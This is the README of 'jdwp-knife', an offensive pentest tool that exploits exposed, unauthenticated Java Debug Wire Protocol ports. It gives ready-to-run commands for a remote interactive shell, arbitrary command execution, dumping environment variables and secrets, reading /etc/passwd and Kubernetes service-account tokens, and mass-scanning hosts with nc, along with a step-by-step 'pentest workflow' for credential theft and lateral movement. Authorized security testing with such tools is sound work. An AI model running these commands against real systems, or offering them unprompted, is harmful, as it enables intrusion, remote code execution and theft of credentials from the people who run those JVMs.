# jdwp-knife

Pentest tool for extracting data from running JVMs via Java Debug Wire Protocol (JDWP).

No shell access needed, no outbound network, no file writes on target. All operations happen through Java method invocations over the JDWP wire protocol.

Based on hugsy's jdwp-shellifier, rewritten for Python 3 with data extraction and interactive shell capabilities.

## Requirements

- Python 3.6+
- Network access to target JDWP port (default 5005)
- Target JVM must be Java 9+ (uses `readAllBytes()`)
- No dependencies beyond stdlib

## Installation

```bash
# From source
git clone https://github.com/s0ld13rr/jdwp-knife.git
cd jdwp-knife
python3 setup.py install

# From Blackarch repo
sudo pacman -S jdwp-knife

# Or just run directly
python3 jdwp-knife.py -t TARGET -p 5005 --shell
```

## Usage

```bash
# Pseudo-interactive shell (cd, ls, cat, whoami — like SSH)
jdwp-knife -t TARGET -p 5005 --shell

# Dump environment variables (credentials, tokens, connection strings)
jdwp-knife -t TARGET -p 5005 --env

# Dump JVM system properties (java.home, user.name, os.*, Spring secrets)
jdwp-knife -t TARGET -p 5005 --props

# List directory
jdwp-knife -t TARGET -p 5005 --ls /app

# Read file
jdwp-knife -t TARGET -p 5005 --cat /etc/passwd

# Execute command with stdout+stderr capture
jdwp-knife -t TARGET -p 5005 --cmd "id"

# Combine multiple operations
jdwp-knife -t TARGET -p 5005 --env --ls /app --cat /app/application.yml

# Full enumeration (props + env + key dirs + key files)
jdwp-knife -t TARGET -p 5005 --all

# Save output to file
jdwp-knife -t TARGET -p 5005 --all -o loot.txt

# Custom breakpoint method (default: java.lang.Thread.sleep)
jdwp-knife -t TARGET -p 5005 --env --break-on "java.lang.Object.wait"
```

## Interactive shell

`--shell` provides a pseudo-interactive TTY with a familiar prompt:

```
root@container-hostname:/app$ whoami
root
root@container-hostname:/app$ ls
app.jar
application.yml
root@container-hostname:/app$ cat application.yml
spring:
  datasource:
    password: s3cret
root@container-hostname:/app$ cd /tmp
root@container-hostname:/tmp$ pwd
/tmp
root@container-hostname:/tmp$ exit
```

Supported builtins: `cd` (with relative paths, `..`, `~`), `pwd`, `exit`. Commands run via `Runtime.exec()` with working directory tracking through `java.io.File`.

No pipes, redirects, or shell operators — `Runtime.exec()` runs binaries directly.

## Options

| Flag | Description |
|------|-------------|
| `-t IP` | Target host (required) |
| `-p PORT` | JDWP port (default: 5005) |
| `--shell` | Pseudo-interactive TTY shell |
| `--env` | Dump all environment variables via `System.getenv()` |
| `--props` | Dump JVM system properties via `System.getProperty()` |
| `--ls PATH` | List directory contents (repeatable) |
| `--cat FILE` | Read file contents (repeatable) |
| `--cmd CMD` | Execute command with stdout+stderr capture |
| `--all` | Full enumeration: `--props` + `--env` + key dirs + key files |
| `--break-on` | Method to set breakpoint on (default: `java.lang.Thread.sleep`) |
| `-o FILE` | Save all output to file |
| `-V` | Show version |

## How it works

1. JDWP handshake (no auth -- protocol has none)
2. Sets breakpoint on a sleeping thread (safe, non-business)
3. When breakpoint hits, invokes Java methods on the suspended thread
4. Reads results back through JDWP protocol (stdout+stderr captured via `readAllBytes()`)
5. Resumes VM

All data extraction (`--env`, `--props`, `--ls`, `--cat`, `--cmd`, `--shell`) returns data through JDWP wire protocol -- no network egress from target needed.

## Breakpoint safety

Only `SUSPEND_EVENTTHREAD` is used -- only the thread that hits the breakpoint is paused, all other threads continue running.

Safe breakpoint targets:
- `java.lang.Thread.sleep` (default) -- idle/monitor threads
- `java.lang.Object.wait` -- waiting threads

Avoid:
- `java.lang.ClassLoader.loadClass` -- breaks class loading
- Kafka/Tomcat-specific methods -- business impact

## Pentest workflow

```bash
# 1. Discover JDWP
echo "JDWP-Handshake" | nc -w3 TARGET 5005

# 2. Interactive recon
jdwp-knife -t TARGET -p 5005 --shell

# 3. Extract credentials
jdwp-knife -t TARGET -p 5005 --env | grep -iE 'pass|secret|key|token|jdbc|aws'

# 4. Read config files
jdwp-knife -t TARGET -p 5005 --cat /app/application.yml

# 5. K8s lateral movement
jdwp-knife -t TARGET -p 5005 --cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 6. Full dump
jdwp-knife -t TARGET -p 5005 --all -o loot.txt

# 7. Mass scan
for ip in $(cat targets.txt); do
  echo "JDWP-Handshake" | nc -w2 $ip 5005 2>/dev/null | grep -q JDWP && echo "[JDWP] $ip"
done
```

## Known limitations

- `--cat` on large files (100+ MB) may cause OOM on target via `readAllBytes()`
- `Runtime.exec(String)` splits by spaces -- no pipes, redirects, or shell operators in commands
- Requires Java 9+ on target (uses `InputStream.readAllBytes()`)
- `cd` in shell is pseudo -- tracks path locally, passes `File` to `exec()`. Symlinks are resolved via `getCanonicalPath()`
